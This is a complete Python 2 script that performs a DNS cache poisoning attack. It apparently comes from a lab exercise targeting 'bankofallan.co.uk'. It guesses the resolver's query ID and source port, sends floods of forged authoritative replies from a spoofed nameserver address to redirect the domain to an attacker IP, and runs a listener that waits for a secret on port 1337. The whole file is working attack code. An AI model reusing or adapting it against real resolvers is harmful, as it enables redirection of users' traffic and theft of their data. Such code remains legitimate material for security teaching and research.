import socket
from dnslib import *
import threading
import sys

UDP_PORT = 53
SECRET_PORT = 1337
DONE = False

def get_qid_and_port(badguy_IP, DNS_IP):
	# GET PORT AND QUERY ID
	#SEND SOCKET
	socket_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	socket_send.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	socket_send.connect((DNS_IP, 53))
	#RECEIVE SOCKET
	socket_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	socket_receive.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	socket_receive.bind((badguy_IP, 53))
	#QUERY PACKET
	query = DNSRecord(DNSHeader(ra=1), q=DNSQuestion("badguy.ru"))
	socket_send.send(query.pack())
	socket_send.close()

 	data, (host, src_port) = socket_receive.recvfrom(2048)
	data = DNSRecord.parse(data)
	qid = data.header.id
	socket_receive.close()
	#print "QUERY ID: %s ; SOURCE PORT: %s" % (qid, src_port)
	return (qid, src_port)


def get_ns(DNS_IP):
	#GET NAME SERVER

	socket_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	socket_send.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	socket_send.connect((DNS_IP, 53))
	query_ns = DNSRecord(DNSHeader(ra=1), q=DNSQuestion("bankofallan.co.uk",QTYPE.NS)) #QUERY PACKET
	socket_send.send(query_ns.pack())

	data, address = socket_send.recvfrom(2048)
	data = DNSRecord.parse(data)
	answer = data.get_a()
	ns_IP = str(answer.rdata)
	ns_hostname = str(answer.rname)[:-1]
	socket_send.close()
	#print "The name server for ns.bankofallan.co.uk is at %s" % ns
	#print
	return (ns_IP, ns_hostname)


def listen(badguy_IP):
	#LISTEN ON PORT 1337 AND WAIT FOR THE SECRET
	final_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	final_socket.bind((badguy_IP, SECRET_PORT))
	print "****"
	print "%s listening on port %s, waiting for secret..." % (badguy_IP, SECRET_PORT)
	while True:
		data, address = final_socket.recvfrom(2048)
		print "---> SECRET RECEIVED:", data
		global DONE
		DONE = True
		break
	final_socket.close()
	print "****"


def poison(badguy_IP, DNS_IP):
	#CACHE POISONING
	qid, port = get_qid_and_port(badguy_IP,DNS_IP)
	ns_IP, ns_hostname = get_ns(DNS_IP)
	sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock_send.connect((DNS_IP, 53))

	sock_spoof = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock_spoof.bind((ns_IP, 53))
	sock_spoof.connect((DNS_IP, port))
	while True:
		#SOCKET WITH SPOOFED IP ADDRESS
		#DNS LOOKUP REQUEST FOR SUBDOMAIN
		if DONE: return()
		query = DNSRecord(DNSHeader(ra=1), q=DNSQuestion("random.bankofallan.co.uk"))
		sock_send.send(query.pack())
		#GENERATE FORGED RESPONSES AND TRY SEVERAL QUERY ID
		for i in range(0,50):
			q_id = qid + i
			query = DNSRecord(DNSHeader(qr=1,ra=1,id=q_id,aa=1), q=DNSQuestion("random.bankofallan.co.uk"))
			answer = query.reply()
			answer.add_answer(RR("random.bankofallan.co.uk",QTYPE.A,rdata=A(badguy_IP),ttl=4800))
			answer.add_auth(RR("bankofallan.co.uk",QTYPE.NS,rdata=NS(ns_hostname),ttl=4800))
			answer.add_ar(RR(ns_hostname,QTYPE.A,rdata=A(badguy_IP),ttl=4800))
			sock_spoof.send(answer.pack())
		#GET NEW QUERY ID AND TRY AGAIN
		qid, port = get_qid_and_port(badguy_IP, DNS_IP)




if __name__=="__main__":

	arglist = sys.argv

	if len(arglist) < 3 or len(arglist) > 3:
		print "Incorrect number of arguments."
		print "Usage: python script.py <badguy_IP> <dns_IP>"
	else:
		BADGUY_IP = str(sys.argv[1])
		DNS_IP = str(sys.argv[2])
		p2 = threading.Thread(target=listen, args=(BADGUY_IP,))
		p2.start()

		p1 = threading.Thread(target=poison, args=(BADGUY_IP, DNS_IP,))
		p1.start()
